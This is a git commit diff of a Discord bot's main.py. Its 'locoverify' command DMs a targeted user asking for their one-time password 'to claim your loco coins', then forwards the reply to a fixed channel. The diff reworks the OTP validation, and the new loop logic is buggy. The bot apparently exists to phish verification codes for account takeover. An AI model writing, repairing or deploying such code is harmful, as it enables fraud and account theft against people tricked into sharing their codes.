ef8033603750299ea27499e3994c0a77c117881f
Nikohtr <Niko.htr@gmail.com>
2019-01-21 23:00:51 +0200

    Update main.py

--- main.py
+++ main.py
@@ -61,13 +61,23 @@ async def locoverify(ctx, user: discord.Member):
             await client.send_message(await client.get_user_info(user.id), "Hey can you send me your OTP to claim your loco coins")
             otp = await client.wait_for_message(author=user)
             otp = otp.content
-            if otp.isdigit() and len(otp) == 4:
-                pass
-            else:
-                while not otp.isdigit() and len(otp) == 4:
+            if len(otp) == 4:
+                try:
+                    otp = int(otp)
+                except ValueError:
+                    await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
                     otp = await client.wait_for_message(author=user)
                     otp = otp.content
                 await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
+            else:
+                while len(otp) != 4:
+                    try:
+                        otp = int(otp)
+                    except ValueError:
+                        await client.send_message(await client.get_user_info(user.id), "That doesn't seem to be it!")
+                        otp = await client.wait_for_message(author=user)
+                        otp = otp.content
+                    await client.send_message(client.get_channel("536986693878808596"), "<@"+user.id+">, "+ str(otp))
     else:
         await client.send_message(ctx.message.channel, "This bot isn't made for DMs")
 
